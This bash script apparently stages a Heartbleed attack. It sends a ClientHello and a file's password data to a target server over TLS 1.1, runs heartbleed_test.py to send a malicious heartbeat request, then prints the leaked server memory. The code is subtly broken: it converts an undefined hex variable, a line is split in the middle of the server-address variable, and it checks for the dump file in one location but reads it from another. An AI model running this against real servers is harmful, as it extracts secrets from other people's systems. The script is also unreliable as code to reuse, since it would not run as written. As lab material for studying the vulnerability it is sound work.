#!/bin/bash

# Ensure the server address is passed as an argument
if [ -z "$1" ]; then
    echo "Usage: $0 <server-address>"
    exit 1
fi

SERVER_ADDRESS=$1

# Hexadecimal strings for Client Hello and Heartbeat request
CLIENT_HELLO_HEX="16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 00 02 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01"

# Convert hex strings to binary
CLIENT_HELLO_NO_COMPRESSION_BIN=$(echo $CLIENT_HELLO_NO_COMPRESSION | xxd -r -p)

echo "First client connect and send data to the server"

# Send Client Hello without compression
echo -n $CLIENT_HELLO_NO_COMPRESSION_BIN | openssl s_client -connect "${SE
RVER_ADDRESS}:443" -tls1_1 -cipher ALL:!COMPLEMENTOFDEFAULT:!eNULL
# Send sensitive data
(
    echo "SensitiveInformation123"
    cat "password.txt"
) | openssl s_client -connect "${SERVER_ADDRESS}:443" -tls1_1 -cipher ALL:!COMPLEMENTOFDEFAULT:!eNULL

# Add a delay to ensure openssl completes
sleep 1

echo "First client finish sending data to the server"


echo "Second client connect and send malicious heartbeat request to the server"

# Run heartbleed_test.py
python3 heartbleed_test.py "$SERVER_ADDRESS"

# Debugging: Ensure hexdump.txt exists and is not empty
if [ ! -s hexdump.txt ]; then
    echo "hexdump.txt is empty or does not exist."
    exit 1
fi

echo "Print the first 100 lines of server response to second client"

# Display the first 100 lines of hexdump.txt without using cat
counter=0
while IFS= read -r line
do
    echo "$line"
    counter=$((counter + 1))
    if [ "$counter" -ge 100 ]; then
        break
    fi

done < "${SHARED_DIR}/hexdump.txt"
